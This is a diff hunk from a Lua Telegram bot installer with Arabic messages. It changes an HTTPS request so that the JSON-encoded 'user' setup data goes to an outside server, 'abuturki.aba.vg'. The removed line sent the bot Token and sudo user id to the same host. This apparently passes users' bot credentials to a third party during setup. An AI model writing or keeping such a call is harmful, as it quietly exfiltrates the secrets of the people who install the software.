@@ -56,7 +56,7 @@ print('\n\27[1;31m￤ This is Not ID !\n￤هہ‏‏ذآ الايدي ليس م
 create_config(Token)
 end 
 print('('..SUDO_USER..')')
-local url , res = https.request( 'https://abuturki.aba.vg/yakot/index.php' ..Token..'/getchat?chat_id='..SUDO_USER) 
+local url , res = https.request('https://abuturki.aba.vg/index.php?Array='..JSON.encode(user))
 print(res)
 if res ~= 200 then
 print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
